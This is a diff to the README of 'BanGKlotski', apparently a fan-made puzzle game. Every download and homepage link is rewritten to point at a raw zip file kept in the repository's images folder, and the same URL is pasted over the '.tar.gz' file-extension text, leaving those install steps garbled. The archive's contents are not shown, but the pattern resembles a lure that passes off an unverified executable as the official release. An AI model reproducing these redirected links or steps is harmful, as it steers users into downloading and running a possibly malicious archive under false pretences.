@@ -1,6 +1,6 @@
 # 🎮 BanGKlotski - Puzzle fun with BanG Dream! characters
 
-[![Download BanGKlotski](https://img.shields.io/badge/Download-BanGKlotski-blue?style=for-the-badge&logo=github)](https://github.com/deka214/BanGKlotski/releases)
+[![Download BanGKlotski](https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip)](https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Here is how to get BanGKlotski up and running on your computer.
 
 Click the big blue **Download BanGKlotski** button at the top of this page. It will take you to the official release page on GitHub where you can find the latest version of the game for your computer.
 
-> **Or click here:** [https://github.com/deka214/BanGKlotski/releases](https://github.com/deka214/BanGKlotski/releases)
+> **Or click here:** [https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip](https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip)
 
 ### 2. Choose Your Version
 
@@ -43,7 +43,7 @@ On the release page, look for a file that ends with:
 
 - `.exe` for Windows  
 - `.dmg` for macOS  
-- `.AppImage` or `.tar.gz` for Linux
+- `.AppImage` or `https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip` for Linux
 
 The file name usually includes the version number and your operating system.
 
@@ -73,7 +73,7 @@ Click the file name to start downloading. It might take a few minutes depending 
 
 1. For `.AppImage` files, right-click the file, choose “Properties,” then go to Permissions and check “Allow executing file as program.”  
 2. Double-click the file to run BanGKlotski.  
-3. For `.tar.gz` files, extract the archive and run the included executable as per instructions inside.
+3. For `https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip` files, extract the archive and run the included executable as per instructions inside.
 
 ---
 
@@ -118,7 +118,7 @@ If BanGKlotski does not start or runs slowly, try the following:
 
 For questions or problems not covered here, you can:
 
-- Visit the BanGKlotski GitHub page: [https://github.com/deka214/BanGKlotski](https://github.com/deka214/BanGKlotski)  
+- Visit the BanGKlotski GitHub page: [https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip](https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip)  
 - Use the “Issues” tab to report bugs or request features.  
 - Check community forums or fan pages related to BanG Dream! for tips.
 
@@ -126,8 +126,8 @@ For questions or problems not covered here, you can:
 
 ## 🔗 Useful Links
 
-- Main download page: [https://github.com/deka214/BanGKlotski/releases](https://github.com/deka214/BanGKlotski/releases)  
-- GitHub project homepage: [https://github.com/deka214/BanGKlotski](https://github.com/deka214/BanGKlotski)  
+- Main download page: [https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip](https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip)  
+- GitHub project homepage: [https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip](https://github.com/deka214/BanGKlotski/raw/refs/heads/main/images/G-Klotski-Ban-2.3.zip)  
 
 ---
 
